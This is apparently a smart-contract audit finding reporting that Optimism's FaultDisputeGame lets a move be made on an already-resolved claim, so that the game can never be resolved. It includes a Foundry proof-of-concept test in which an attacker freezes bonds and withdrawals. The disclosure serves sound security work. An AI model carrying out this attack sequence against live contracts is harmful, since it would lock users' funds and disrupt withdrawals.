Tame Orchid Snail

high

# `FaultDisputeGame:move` can be called after `resolveClaim` makes the game unable to be resolved

## Summary

Depending on how the time was spent by each team, move/attack/defend may be able to be called on resolved claim. It will lead to un-resolvable game, resulting in the frozen bond and it may undermine withdrawal process of OptimismPortal2.

## Vulnerability Detail

In the proof of concept below shows a case where `attack` was made on a resolved claim, ending up the game to be frozen (not resolvable anymore):

In below code the following scenario is played out:
1. attack move was done four times resulting in five nodes: `0(root) - 1 - 2 - 3 -4`. Note that the challenger team tooke longer time than the defender team.
2. time was passed. The time was chosen so that it has passed enough to resolve one of the challenger's node but still has time left for the defender's team to make a move
3. challenger's node 3 is resolved
4. now a malicious actor alice will make a move on the resolved challenger's node 3.
5. enough time is passed for both challenger/defender can resolve nodes
6. the alice's node can be resolved, therefore the alice will get her bond back (with delay)
7. the node 3, that alice attacked, cannot be resolved, as it was already resolved before the alice's move
8. the node 2, the parent of node 3, cannot be resolved, as node 3 still has a child (the alice's node is still in the subgames of node 3, since the node 3 itself cannot be resolved after the new node added).
9. all the node upwards from node 3, as well as the entire `resolve` function cannot be resolved for the same error of `OutOfOrderResolution`.

Note that alice does not care about the game's resolution, therefore she will just pick a side with less time left, resolve any node from that team when it is possible to resolve, then make a move on the resolved node. Given it is more common to have different durations of the game spent by each team, it is likely that a malicious actor can find such a time window for many games. Therefore, it is very well possible to keep diasbling games using this vulnerability, resulting in freezing the withdrawals on the OptimismPortal2 for a while.

Also note that alice herself does not lock the bond for herself as she can resolve her own node. It means the cost of attack is not as high as the damage caused.

If the optimism protocol notices these rogue activities, they can recover all funds locked using the owner account of the DelayedWETH. Also, the Alice may lose her bonds, if the rescue of fund was before her withdrawal. Nevertheless, the optimism team will not make the game to resolve once the game is in this frozen state.

```solidity
// a function in FaultDisputeGame_Test
    function test_attack_resolved_node() public {
        // Alice will make the resolve not possible
        address alice = address(0xa11ce);
        vm.deal(alice, 100 ether);

        // challenger takes longer time
        vm.warp(block.timestamp + 2000 seconds);
        gameProxy.attack{ value: _getRequiredBond(0) }(0, _dummyClaim());
        vm.warp(block.timestamp + 10 seconds);
        gameProxy.attack{ value: _getRequiredBond(1) }(1, _dummyClaim());
        vm.warp(block.timestamp + 2000 seconds);
        gameProxy.attack{ value: _getRequiredBond(2) }(2, _dummyClaim());
        vm.warp(block.timestamp + 30 seconds);
        gameProxy.attack{ value: _getRequiredBond(3) }(3, _dummyClaim());


        // This timestamp is chosen
        // 1. to be able to resolve challenger's node (3)
        // 2. to be able to still have time left for defender
        vm.warp(1691213394);

        // challenger node 3 is resolved
        gameProxy.resolveClaim(3);

        // defender could still attack on the node 3
        // Alice will attack on already resolved node
        vm.startPrank(alice);
        // this will be 5th
        gameProxy.attack{ value: _getRequiredBond(3) }(3, _dummyClaim());
        vm.stopPrank();

        // random time passed long enough all the claims can be resolved
        vm.warp(block.timestamp + 7 days);

        // Alice can get the bond back with delay
        uint beforeCredit = gameProxy.credit(alice);
        gameProxy.resolveClaim(5);
        assertEq(_getRequiredBond(3), gameProxy.credit(alice) - beforeCredit);

        // Any node above can be resolved anymore -> the bond will be frozen due to
        // 1. ClaimAlreadyResolved: for the node already resolved
        vm.expectRevert(abi.encodeWithSignature("ClaimAlreadyResolved()"));
        gameProxy.resolveClaim(3);
        // 2. OutOfOrderResolution, since the node 3 cannot be resolved (above)
          // also the node 3 has a child 5
        vm.expectRevert(abi.encodeWithSignature("OutOfOrderResolution()"));
        gameProxy.resolveClaim(2);
        vm.expectRevert(abi.encodeWithSignature("OutOfOrderResolution()"));
        gameProxy.resolveClaim(1);
        vm.expectRevert(abi.encodeWithSignature("OutOfOrderResolution()"));
        gameProxy.resolveClaim(0);
        vm.expectRevert(abi.encodeWithSignature("OutOfOrderResolution()"));
        gameProxy.resolve();
    }
```

The cause of the bug is from mismatch the checks between
1. creation of a new move
2. resolution of a node

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L268-L284

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L412-L416


As it was shown in the example above, there might be a moment in time when it is possible to resolve a node, yet it is also possible to make a move on the node. If it happens in that order, the node in question cannot be resolved, since it is already resolved. At the same time, since a new move was made on the node, the node has this new child. This leads to OutOfOrder resolution, if any node upwards is tried to be resolved.

## Impact

It gives malicious actors relatively cheap way (unless they get caught in time) to freeze the withdrawal process, by disable any resolution of games.

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L268-L284

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L412-L416

## Tool used

Manual Review

## Recommendation

Due to the complexity of the game contract and the intention of the protocol, it is unclear what would be the best way to mitigate this issue.

One possibility is to wait for the full `GAME_DURATION` to resolve any claim. However, it will essentially double the delay, which is probably not desireable.

